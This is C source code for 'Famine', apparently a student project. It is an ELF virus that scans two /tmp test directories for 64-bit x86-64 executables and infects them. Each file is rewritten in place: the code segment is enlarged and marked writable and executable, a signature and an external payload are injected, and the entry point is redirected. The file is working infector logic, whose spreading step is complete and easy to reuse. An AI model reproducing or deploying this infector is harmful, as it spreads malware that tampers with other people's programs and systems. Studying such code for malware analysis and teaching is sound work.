/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
/*   Updated: 2019/09/12 15:55:44 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <elf.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>

#define READ		0
#define WRITE		1
#define OPEN		2
#define CLOSE		3
#define STAT		4
#define LSEEK		8
#define MMAP		9
#define MUNMAP		11
#define GETDENTS64	217
#define FAMINE_DEBUGGABLE_EXECUTABLE_OUT

void			find_files(char *dir);
void			get_dat_elf(char *dir, char *file);
int				check_dat_elf(size_t size, char *map);
void			pack_dat_elf(char *path, int size, char *data);
int				dat_elf_is_infected(char *data, int size);
void			famine64_func(void);
extern uint32_t	famine64_size;
extern uint32_t	famine64_data;
extern uint64_t famine64_signature;

struct linux_dirent64 {
	ino_t          d_ino;    /* 64-bit inode number */
	off_t          d_off;    /* 64-bit offset to next structure */
	unsigned short d_reclen; /* Size of this dirent */
	unsigned char  d_type;   /* File type */
	char           d_name[]; /* Filename (null-terminated) */
};

int main()
{
	char	*direct[] = { "/tmp/test/", "/tmp/test2/", NULL };
	size_t	i;

	i = 0;
	while (direct[i])
	{
		find_files(direct[i]);
		i++;
	}
	return 0;
}

void	find_files(char *dir)
{
	int		fd;
	char	buff[1024];
	int		ret;
	int		off;

	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
	if (fd == -1)
		return ;
	while ((ret = syscall(GETDENTS64, fd, buff, 1024)) > 0)
	{
		off = 0;
		while (off < ret)
		{
			struct linux_dirent64 *linux64 = (struct linux_dirent64 *)(buff + off);
			if (linux64->d_type == DT_REG)
				get_dat_elf(dir, linux64->d_name);
			off += linux64->d_reclen;
		}
	}
	syscall(CLOSE, fd);
}

void	get_dat_elf(char *dir, char *file)
{
	char	path[1024];
	char	buf[1024];
	int		fd;
	int		size;
	void	*data;
	int		i;
	int		j;
	int		ret;

	i = 0;
	while (dir[i])
	{
		path[i] = dir[i];
		i++;
	}
	j = 0;
	while (file[j])
	{
		path[i + j] = file[j];
		j++;
	}
	path[i + j] = '\0';
	fd = syscall(OPEN, path, O_RDONLY|O_NONBLOCK);
	if (fd == -1)
		return ;
	size = syscall(LSEEK, fd, 1, SEEK_END);
	if (size <= 0)
	{
		syscall(CLOSE, fd);
		return ;
	}
	// data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	if (data == MAP_FAILED)
	{
		syscall(CLOSE, fd);
		return ;
	}
	if (syscall(LSEEK, fd, 0, SEEK_SET) < 0)
	{
		syscall(CLOSE, fd);
		syscall(MUNMAP, data, size);
		return ;
	}
	i = 0;
	while ((ret = syscall(READ, fd, buf, sizeof(buf))) > 0)
	{
		j = 0;
		while (j < ret)
		{
			((char *)data)[i + j] = buf[j];
			j++;
		}
		i += j;
	}
	syscall(CLOSE, fd);
	if (ret == 0)
		if (check_dat_elf(size, data))
			pack_dat_elf(path, size, data);
	syscall(MUNMAP, data, size);
}

int				check_dat_elf(size_t size, char *map)
{
	Elf64_Ehdr	*file;

	file = (Elf64_Ehdr *)map;
	if (size < sizeof(Elf64_Ehdr))
		return (0);
	/* Check header integrity */
	if (file->e_ident[0] != 0x7f || file->e_ident[1] != 'E' || file->e_ident[2] != 'L' || file->e_ident[3] != 'F'
	|| file->e_ident[EI_CLASS] != ELFCLASS64
	|| file->e_ident[EI_DATA] == ELFDATANONE
	|| file->e_ident[EI_VERSION] != EV_CURRENT
	|| (file->e_type != ET_EXEC && file->e_type != ET_DYN)
	|| file->e_machine != EM_X86_64)
		return (0);
	/* Check offsets integrity */
	if (file->e_phoff != sizeof(Elf64_Ehdr)
	|| file->e_phoff + file->e_phnum * sizeof(Elf64_Phdr) > (Elf64_Off)size
	|| file->e_shoff < sizeof(Elf64_Ehdr)
	|| file->e_shoff + file->e_shnum * sizeof(Elf64_Shdr) > (Elf64_Off)size
	|| file->e_ehsize != sizeof(Elf64_Ehdr)
	|| file->e_phentsize != sizeof(Elf64_Phdr)
	|| file->e_shentsize != sizeof(Elf64_Shdr)
	|| file->e_shstrndx <= SHN_UNDEF || file->e_shstrndx >= file->e_shnum)
		return (0);
	return (1);
}

static int	my_strcmp(const char *s1, const char *s2)
{
	if (s1 && s2)
	{
		while (*s1 && *s2 && *s1 == *s2)
		{
			s1++;
			s2++;
		}
		return (*s1 != *s2);
	}
	return (s1 != s2);
}

void		pack_dat_elf(char *path, int size, char *data)
{
	Elf64_Phdr	*program = (Elf64_Phdr *)(data + ((Elf64_Ehdr *)data)->e_phoff);
	Elf64_Phdr	*iprogram = NULL;
	Elf64_Shdr	*section = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff);
	Elf64_Shdr	*isection = NULL;
	char		*s_table;
	int			idx;
	uint64_t	psize;

	idx = ((Elf64_Ehdr *)data)->e_shstrndx;
	s_table = (char *)(data + section[idx].sh_offset);
	isection = NULL;
	/* 1.A Find the .text section */
	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++)
	{
		char *name = s_table + section[i].sh_name;
		if (my_strcmp(name, ".text") == 0)
		{
			isection = section + i;
			/* Find the PT_LOAD segment who contains the .text section */
			for (size_t j = 0; j < ((Elf64_Ehdr *)data)->e_phnum; j++)
			{
				if (program[j].p_type == PT_LOAD
				&& isection->sh_offset >= program[j].p_vaddr
				&& isection->sh_offset < program[j].p_vaddr + program[j].p_filesz)
				{
					iprogram = program + j;
					break ;
				}
			}
			break ;
		}
	}
	/* 1.B Find the PT_LOAD segment who contains the entry point */
	if (isection == NULL || iprogram == NULL)
	{
		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++)
		{
			isection = section + i;
			if (((Elf64_Ehdr *)data)->e_entry >= isection->sh_addr
			&& ((Elf64_Ehdr *)data)->e_entry < isection->sh_addr + isection->sh_size)
			{
				/* Find the PT_LOAD segment who contains the entry point */
				for (size_t j = 0; j < ((Elf64_Ehdr *)data)->e_phnum; j++)
				{
					if (program[j].p_type == PT_LOAD
					&& ((Elf64_Ehdr *)data)->e_entry >= program[j].p_vaddr
					&& ((Elf64_Ehdr *)data)->e_entry < program[j].p_vaddr + program[j].p_filesz)
					{
						iprogram = &program[j];
						break ;
					}
				}
				break ;
			}
		}
	}
	if (isection == NULL || iprogram == NULL)
		return ;

	/* 2. Check if file is already infected */
	uint64_t	signature = *(uint64_t *)(data + ((Elf64_Ehdr *)data)->e_entry - iprogram->p_vaddr - sizeof(famine64_signature));
	printf("file: %s signature: %#llX", path, signature);
	if (signature == famine64_signature) {
		printf(" -> Already infected\n");
		return ;
	}

	/* 3. Re-open the file */
	int fd = syscall(OPEN, path, O_WRONLY|O_TRUNC|O_EXCL);
	if (fd == -1) {
		write(1, "OPEN file failed\n", 17);
		return ;
	}

	/* 4. Save values usefull for later */
		/* Where we write our code */
	Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz;
		/* old entry point offset */
	Elf64_Addr old_entry = (off - (((Elf64_Ehdr *)data)->e_entry - iprogram->p_vaddr) + sizeof(famine64_signature)) * (-1);

	/* 5. Change Elf Header entry point */
	((Elf64_Ehdr *)data)->e_entry = off + iprogram->p_vaddr + sizeof(famine64_signature); // New entry point
	/* 6. Check if we have room to write our code */
	/* Get the next segment */
	Elf64_Phdr *next_ptload = NULL;
	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++)
	{
		if (program[i].p_offset > iprogram->p_offset + iprogram->p_filesz)
			if (!next_ptload || program[i].p_offset < next_ptload->p_offset)
				next_ptload = program + i;
	}
	if (next_ptload != NULL)
	{
		Elf64_Addr	padding = 0;
		psize = famine64_size + sizeof(famine64_signature);
		if (iprogram->p_offset + iprogram->p_filesz + psize > next_ptload->p_offset)
		{
			while (padding < psize)
				padding += 0x1000;
			/* Change Section Table offset */
			((Elf64_Ehdr *)data)->e_shoff += padding;
			/* Change Program offset */
			for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
				if (program[i].p_offset >= iprogram->p_offset + iprogram->p_filesz)
				{
					if (iprogram->p_offset + iprogram->p_filesz + padding > program[i].p_vaddr)
						return ;
					program[i].p_offset += padding;
				}
			}
			/* Change Sections offset */
			for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
				if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz) {
					section[i].sh_offset += padding;
				}
			}
		}
		else
			padding = psize;
		iprogram->p_filesz += padding;
		iprogram->p_memsz += padding;
		iprogram->p_flags = PF_R | PF_W | PF_X;
		#ifdef FAMINE_DEBUGGABLE_EXECUTABLE_OUT
		isection->sh_size += padding;
		#endif
		syscall(WRITE, fd, data, off);
		syscall(WRITE, fd, &famine64_signature, sizeof(famine64_signature));
		syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
		syscall(WRITE, fd, &old_entry, sizeof(old_entry));
		if (padding == psize)
			off += psize;
		else
			while (padding-- > psize)
				syscall(WRITE, fd, "\0", 1);
		syscall(WRITE, fd, data + off, size - off - 1);
		syscall(CLOSE, fd);
		printf(" -> Infected\n");
	}
}

/*
		typedef struct
		{
16			unsigned char e_ident[EI_NIDENT];	0
2			Elf64_Half    e_type;				16
2			Elf64_Half    e_machine;			18
4			Elf64_Word    e_version;			20
8			Elf64_Addr    e_entry;				24
8			Elf64_Off     e_phoff;				32
8			Elf64_Off     e_shoff;				40
4			Elf64_Word    e_flags;				48
2			Elf64_Half    e_ehsize;				52
2			Elf64_Half    e_phentsize;			54
2			Elf64_Half    e_phnum;				56
2			Elf64_Half    e_shentsize;			58
2			Elf64_Half    e_shnum;				60
2			Elf64_Half    e_shstrndx;			62
64		} Elf64_Ehdr;

		typedef struct
		{
4			Elf64_Word    p_type;				0
4			Elf64_Word    p_flags;				4
8			Elf64_Off     p_offset;				8
8			Elf64_Addr    p_vaddr;				16
8			Elf64_Addr    p_paddr;				24
8			Elf64_Xword   p_filesz;				32
8			Elf64_Xword   p_memsz;				40
8			Elf64_Xword   p_align;				48
56		} Elf64_Phdr;

		typedef struct
		{
4			Elf64_Word    sh_name;				0
4			Elf64_Word    sh_type;				4
8			Elf64_Xword   sh_flags;				8
8			Elf64_Addr    sh_addr;				16
8			Elf64_Off     sh_offset;			24
8			Elf64_Xword   sh_size;				32
4			Elf64_Word    sh_link;				40
4			Elf64_Word    sh_info;				44
8			Elf64_Xword   sh_addralign;			48
8			Elf64_Xword   sh_entsize;			56
64		} Elf64_Shdr;
*/
